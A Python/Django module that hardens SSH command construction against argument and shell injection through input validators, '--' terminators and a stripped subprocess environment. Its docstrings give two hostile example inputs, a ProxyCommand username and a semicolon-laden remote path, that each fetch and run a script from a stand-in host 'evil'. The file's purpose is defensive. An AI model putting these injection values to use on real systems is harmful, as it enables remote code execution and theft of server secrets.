"""SSH argument-injection defenses shared by every remote-credential sink.

Threat
------
An authenticated user controls ``ssh_username`` / ``ssh_host`` on a
:class:`RemoteCredential`. Those values are interpolated into an ssh(1)
argv as the destination ``f"{user}@{host}"``. ssh treats any argument
that begins with ``-`` as an OPTION, so a username such as
``-oProxyCommand=curl http://evil|sh`` makes ssh run the ProxyCommand
via ``/bin/sh`` ON THIS HOST, as the Django UID, inheriting the Django
process environment (SECRET_KEY, DB credentials). That is host RCE.

Defense in depth — three layers, applied together:

1. POINT-OF-USE validation (:func:`validate_ssh_username` /
   :func:`validate_ssh_host`): reject a value that starts with ``-`` or
   contains whitespace / ``@`` / control characters, and restrict to a
   sane host/username charset. Fail loud.

   This runs inside :func:`ssh_destination` / :func:`ssh_remote_target`,
   i.e. at the moment an argv is BUILT — not only at the moment input is
   accepted. That distinction matters: there is no backfill migration, so
   a ``RemoteCredential`` / ``RemoteProjectConfig`` row written while the
   hole was open still carries its malicious value. Validating where the
   value is USED blocks those stored rows too, and it covers the sinks
   that read ``RemoteProjectConfig.ssh_username`` / ``ssh_host`` (copied
   verbatim from the credential at project creation) rather than the
   credential itself.
2. ``--`` end-of-options terminator inserted immediately before the
   destination token in every ssh(1) argv built here. Even if a dashed
   value reached ssh, ``--`` forces it to be read as the destination,
   never as an option.

   NOTE the limit of this layer: it is real for ssh(1) (getopt), but it
   is INERT for ``ssh-copy-id``, which is a shell script whose own
   ``getopts`` consumes the ``--`` and then re-emits ``USER_HOST`` to an
   inner ssh with no terminator. It is likewise not guaranteed for
   ``sshfs`` / ``rsync``, whose targets are positional. Layer 1 — not
   layer 2 — is what actually protects those three sinks, which is
   precisely why layer 1 lives at the point of use.
3. Minimal subprocess environment (:func:`minimal_ssh_env`): ssh sinks
   run with a stripped, allow-listed environment so a ProxyCommand that
   somehow slipped through cannot read Django secrets.

Layers 1+2 close the injection; layer 3 closes the secret exposure.
"""

import os
import re

from django.core.exceptions import ValidationError

# Allow-list charsets. The leading character must be alphanumeric, which
# alone forbids a leading '-' (option injection). The remaining allowed
# characters exclude whitespace, '@', shell metacharacters and control
# characters by construction, while still accepting every legitimate
# POSIX username and DNS/IP host (including IPv6 ':' and '[]').
_USERNAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")
_HOST_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._\-:\[\]]*$")

# A remote path is not an ssh OPTION (it is always positional or after a
# ':'), but it IS interpolated unquoted into a remote shell command
# ("cd {remote_path} 2>/dev/null; exec bash -l") and rsync additionally
# expands its remote path through a remote shell. So it must not carry
# shell metacharacters. Absolute POSIX paths only; no whitespace (the
# existing unquoted "cd {path}" already breaks on a space, so this
# forbids nothing that used to work).
_REMOTE_PATH_RE = re.compile(r"^/[A-Za-z0-9._\-/+@=,:]*$")


def _validate_ssh_token(value, field_label, allowed_re):
    """Reject argument-injection-prone SSH tokens. Raises ValidationError.

    The individual checks come before the catch-all charset check so the
    error message names the concrete problem (fail loud, not a vague
    "invalid characters").
    """
    if not isinstance(value, str) or value == "":
        raise ValidationError(f"{field_label} must not be empty.")
    if value.startswith("-"):
        raise ValidationError(
            f"{field_label} must not start with '-' "
            "(it would be parsed as an ssh option)."
        )
    if any(ch.isspace() for ch in value):
        raise ValidationError(f"{field_label} must not contain whitespace.")
    if "@" in value:
        raise ValidationError(f"{field_label} must not contain '@'.")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in value):
        raise ValidationError(
            f"{field_label} must not contain control characters."
        )
    if not allowed_re.match(value):
        raise ValidationError(
            f"{field_label} contains characters that are not allowed."
        )


def validate_ssh_username(value):
    """Django validator: reject an injection-prone SSH username."""
    _validate_ssh_token(value, "SSH username", _USERNAME_RE)


def validate_ssh_host(value):
    """Django validator: reject an injection-prone SSH host."""
    _validate_ssh_token(value, "SSH host", _HOST_RE)


def validate_remote_path(value):
    """Django validator: reject a shell-injection-prone remote path.

    ``remote_path`` reaches a remote shell unquoted (``cd {remote_path}``
    in the terminal spawns, and rsync expands its remote path through a
    remote shell). A value such as ``/home/u; curl http://evil | sh``
    would therefore run on the remote host.
    """
    if not isinstance(value, str) or value == "":
        raise ValidationError("Remote path must not be empty.")
    if not value.startswith("/"):
        raise ValidationError("Remote path must be absolute (start with '/').")
    if any(ch.isspace() for ch in value):
        raise ValidationError("Remote path must not contain whitespace.")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in value):
        raise ValidationError("Remote path must not contain control characters.")
    if not _REMOTE_PATH_RE.match(value):
        raise ValidationError(
            "Remote path contains characters that are not allowed "
            "(shell metacharacters are rejected)."
        )


def ssh_destination(ssh_user, ssh_host):
    """Return the VALIDATED ``user@host`` destination token.

    Validation happens here, at the point the argv is built, so that a
    malicious value that was stored before this fix landed (there is no
    backfill migration) is still blocked when it reaches a sink.
    """
    validate_ssh_username(ssh_user)
    validate_ssh_host(ssh_host)
    return f"{ssh_user}@{ssh_host}"


def ssh_remote_target(ssh_user, ssh_host, remote_path):
    """Return the VALIDATED ``user@host:path`` target for sshfs / rsync.

    sshfs and rsync take this as a POSITIONAL argument, where a ``--``
    terminator is not a reliable defense — validation is the defense.
    """
    validate_remote_path(remote_path)
    return f"{ssh_destination(ssh_user, ssh_host)}:{remote_path}"


def minimal_ssh_env():
    """Return a minimal, allow-listed environment for ssh subprocesses.

    Only benign variables ssh legitimately needs are forwarded. Django
    secrets (SECRET_KEY, DB credentials, tokens) are excluded BY
    CONSTRUCTION: they are never on the allow-list, so a malicious
    ProxyCommand/LocalCommand cannot read them from the environment.

    ``SSH_AUTH_SOCK`` is deliberately NOT forwarded: every sink here
    authenticates with an explicit ``-i <key>``, so handing the child the
    Django host's agent socket would only widen lateral movement.

    ``TERM`` is defaulted rather than merely forwarded. Daphne/celery do
    not run under a tty, so ``TERM`` is normally unset in the Django
    process; without a default, ``ssh -t`` would allocate a pty with an
    empty terminal type and break colours / vim / less on the remote
    side. The local terminal paths already pin ``xterm-256color``.
    """
    env = {
        "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
        "HOME": os.environ.get("HOME", "/tmp"),
        "TERM": os.environ.get("TERM") or "xterm-256color",
    }
    for key in ("LANG", "LC_ALL", "LC_CTYPE"):
        val = os.environ.get(key)
        if val is not None:
            env[key] = val
    return env


def ssh_probe_argv(
    *, ssh_port, ssh_key, ssh_user, ssh_host, remote_command="echo OK",
    connect_timeout=10,
):
    """argv for a non-interactive connectivity probe (``--`` hardened)."""
    return [
        "ssh",
        "-p", str(ssh_port),
        "-i", ssh_key,
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", f"ConnectTimeout={connect_timeout}",
        "--",
        ssh_destination(ssh_user, ssh_host),
        remote_command,
    ]


def ssh_login_argv(
    *, ssh_port, ssh_key, ssh_user, ssh_host, remote_command,
    tty=True, keepalive=True,
):
    """argv for an interactive login shell over ssh (``--`` hardened)."""
    argv = ["ssh"]
    if tty:
        argv.append("-t")
    argv += [
        "-p", str(ssh_port),
        "-i", ssh_key,
        "-o", "StrictHostKeyChecking=accept-new",
    ]
    if keepalive:
        argv += ["-o", "ServerAliveInterval=30"]
    argv += ["--", ssh_destination(ssh_user, ssh_host), remote_command]
    return argv


def ssh_copy_id_argv(*, ssh_password, pub_key_path, ssh_port, ssh_user, ssh_host):
    """argv for ``sshpass ... ssh-copy-id ...``.

    The ``--`` below is cosmetic for this sink only: ssh-copy-id is a
    shell script whose own ``getopts`` eats the terminator and then hands
    ``USER_HOST`` to an inner ssh WITHOUT one. What actually protects
    this sink is the validation inside :func:`ssh_destination`.
    """
    return [
        "sshpass",
        "-p", ssh_password,
        "ssh-copy-id",
        "-i", pub_key_path,
        "-p", str(ssh_port),
        "-o", "StrictHostKeyChecking=accept-new",
        "--",
        ssh_destination(ssh_user, ssh_host),
    ]


# EOF
